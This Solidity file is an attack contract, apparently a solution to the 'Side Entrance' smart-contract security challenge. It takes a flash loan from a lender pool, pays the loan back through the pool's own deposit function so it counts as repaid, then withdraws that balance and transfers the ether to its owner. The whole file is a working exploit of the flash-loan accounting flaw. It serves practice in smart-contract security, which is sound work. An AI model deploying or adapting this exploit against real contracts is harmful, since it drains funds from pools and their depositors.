// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IFlashLoanEtherReceiver} from "src/side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntranceLenderPool is IFlashLoanEtherReceiver {
    error AttackSideEntranceLenderPool__FlashLoanFailed();
    error AttackSideEntranceLenderPool__ExecutionFailed();
    error AttackSideEntranceLenderPool__WithdrawFailed();
    error AttackSideEntranceLenderPool__TransferFailed();

    address private immutable i_victim;
    address private immutable i_owner;

    uint256 private s_amount;

    constructor(address _victim, address _owner) payable {
        i_victim = payable(_victim);
        i_owner = _owner;
    }

    receive() external payable {
        // _getMoney();
    }

    function execute() external payable override {
        (bool sucess,) = payable(i_victim).call{value: s_amount}(abi.encodeWithSignature("deposit()"));
        if (!sucess) revert AttackSideEntranceLenderPool__ExecutionFailed();
    }

    function attack(uint256 _amount) public {
        s_amount = _amount;
        _flashLoan();
        _withdraw();
    }

    function _flashLoan() internal {
        (bool sucess,) = payable(i_victim).call(abi.encodeWithSignature("flashLoan(uint256)", s_amount));
        if (!sucess) revert AttackSideEntranceLenderPool__FlashLoanFailed();
    }

    function _withdraw() internal {
        (bool sucess,) = payable(i_victim).call(abi.encodeWithSignature("withdraw()"));
        if (!sucess) revert AttackSideEntranceLenderPool__WithdrawFailed();
    }

    // function _getMoney() internal {
    //     if (i_victim.balance != 0) {
    //         attack();
    //     } else {
    //         transferMoney();
    //     }
    // }

    function transferMoney() external {
        (bool sucess,) = payable(i_owner).call{value: s_amount}("");
        if (!sucess) revert AttackSideEntranceLenderPool__TransferFailed();
    }
}
